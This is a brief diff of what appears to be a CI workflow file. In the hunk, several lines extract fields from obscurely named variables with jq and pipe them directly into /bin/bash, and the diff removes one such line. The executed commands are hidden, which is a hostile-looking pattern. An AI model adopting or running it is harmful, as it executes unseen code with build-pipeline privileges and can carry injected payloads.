@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$lac677" | jq -r .bq51 | /bin/bash
           echo $h32941 | jq -r .tzp874 | /bin/bash
           printf '%s' "$ypgne5" | jq -r .iswlm805 | /bin/bash
-          printf '%s' "$a7447" | jq -r .rdmtq7805 | /bin/bash
           echo $tsz8 | jq -r .vd049 | /bin/bash
 
       - name: Upload results
